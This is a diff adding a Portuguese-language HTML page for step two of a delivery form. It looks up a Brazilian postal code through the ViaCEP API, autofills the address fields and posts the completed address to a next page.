@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CEP para Entrega</title>
+    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/6136/6136958.png">
+    <style>
+        body {
+            margin: 0; /* Remove a margem padrão */
+        }
+    
+        img {
+            width: 100%; /* Ajusta a imagem para a largura do cabeçalho */
+            height: auto; /* Mantém a proporção da imagem */
+        }
+    
+        /* Adiciona um espaço ao conteúdo para evitar que fique atrás do cabeçalho */
+        .content {
+            padding-top: 100px; /* Ajuste conforme a altura do cabeçalho */
+        }
+    </style>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+        header {
+            width: 100%;
+            overflow: hidden;
+        }
+        img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        .container {
+            padding: 20px;
+            flex: 1;
+        }
+        .step {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+            color: #000;
+        }
+        .step-number {
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background-color: #000;
+            color: #fff;
+            margin-right: 10px;
+            font-weight: bold;
+        }
+        .step-text {
+            font-size: 20px;
+            font-weight: bold;
+        }
+        .subtext {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 20px;
+        }
+        .cep-container {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            margin-top: 10px;
+        }
+        .cep-input {
+            width: 80%;
+            max-width: 250px;
+            padding: 8px;
+            border-radius: 10px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+        }
+        .address-container {
+            display: none;
+            flex-direction: column;
+            margin-top: 20px;
+            width: 80%;
+            max-width: 300px;
+        }
+        .address-container input {
+            margin-bottom: 10px;
+            padding: 8px;
+            border-radius: 10px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+            width: 100%;
+        }
+        .submit-button {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 10px;
+            background-color: #28a745; /* Botão verde */
+            color: #fff;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .submit-button:hover {
+            background-color: #218838;
+        }
+        .floating-message {
+            display: none;
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #ff4444;
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 14px;
+            z-index: 1000;
+        }
+        footer {
+            background-color: #333;
+            padding: 0;
+            text-align: center;
+            width: 100%;
+        }
+        footer img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <img src="a1.png" alt="Imagem do Cabeçalho">
+    </header>
+    
+    <div class="container">
+        <div class="step">
+            <div class="step-number">2</div>
+            <div class="step-text">Endereço</div>
+        </div>
+        <div class="subtext">Informe o seu endereço para entrega</div>
+        
+        <div class="cep-container">
+            <input type="text" class="cep-input" id="cep" placeholder="Digite o CEP">
+            <button class="submit-button" onclick="verificarCEP()">Verificar CEP</button>
+        </div>
+
+        <div class="address-container" id="address-container">
+            <input type="text" id="rua" placeholder="Rua">
+            <input type="text" id="bairro" placeholder="Bairro">
+            <input type="text" id="cidade" placeholder="Cidade">
+            <input type="text" id="estado" placeholder="Estado">
+            <input type="text" id="numero" placeholder="Número">
+            <input type="text" id="complemento" placeholder="Complemento">
+            <button class="submit-button" onclick="submitForm()">Confirmar</button>
+        </div>
+
+        <div class="floating-message" id="floating-message">
+            Por favor, preencha todos os campos corretamente.
+        </div>
+    </div>
+
+    <footer>
+        <img src="p3.png" alt="Imagem do Rodapé">
+    </footer>
+
+    <script>
+        // Função para exibir a mensagem flutuante
+        function showMessage(message) {
+            const floatingMessage = document.getElementById('floating-message');
+            floatingMessage.textContent = message;
+            floatingMessage.style.display = 'block';
+            setTimeout(() => {
+                floatingMessage.style.display = 'none';
+            }, 3000);
+        }
+
+        // Função para buscar o CEP utilizando a API do ViaCEP
+        function buscaCEP(cep) {
+            let cepValue = cep.replace(/\D/g, '');
+
+            if (cepValue !== '') {
+                let validacep = /^[0-9]{8}$/;
+
+                if (validacep.test(cepValue)) {
+                    fetch(`https://viacep.com.br/ws/${cepValue}/json/`)
+                        .then(response => response.json())
+                        .then(data => {
+                            if (!("erro" in data)) {
+                                // Preenchendo os campos com os dados retornados pela API
+                                document.getElementById('rua').value = data.logradouro;
+                                document.getElementById('bairro').value = data.bairro;
+                                document.getElementById('cidade').value = data.localidade;
+                                document.getElementById('estado').value = data.uf;
+
+                                // Exibindo o formulário de endereço
+                                document.getElementById('address-container').style.display = 'flex';
+                            } else {
+                                showMessage("CEP não encontrado.");
+                            }
+                        })
+                        .catch(error => console.error("Erro ao buscar o CEP:", error));
+                } else {
+                    showMessage("Formato de CEP inválido.");
+                }
+            } else {
+                showMessage("Por favor, insira um CEP.");
+            }
+        }
+
+        // Função para verificar o CEP e exibir os campos de endereço
+        function verificarCEP() {
+            const cep = document.getElementById('cep').value;
+            buscaCEP(cep);
+        }
+
+        // Função para redirecionar para p3.html e enviar os dados
+        function submitForm() {
+            const rua = document.getElementById('rua').value;
+            const bairro = document.getElementById('bairro').value;
+            const cidade = document.getElementById('cidade').value;
+            const estado = document.getElementById('estado').value;
+            const numero = document.getElementById('numero').value;
+            const complemento = document.getElementById('complemento').value;
+
+            if (rua && bairro && cidade && estado && numero) {
+                const submitButton = document.querySelector('.address-container .submit-button');
+                submitButton.textContent = 'Processando...';
+                submitButton.disabled = true;
+
+                setTimeout(() => {
+                    const formData = new FormData();
+                    formData.append('rua', rua);
+                    formData.append('bairro', bairro);
+                    formData.append('cidade', cidade);
+                    formData.append('estado', estado);
+                    formData.append('numero', numero);
+                    formData.append('complemento', complemento);
+
+                    fetch('p3.html', {
+                        method: 'POST',
+                        body: formData
+                    }).then(() => {
+                        window.location.href = 'p3.html';
+                    });
+                }, 1000);
+            } else {
+                showMessage("Por favor, preencha todos os campos corretamente.");
+            }
+        }
+    </script>
+    
+</body>
+</html>
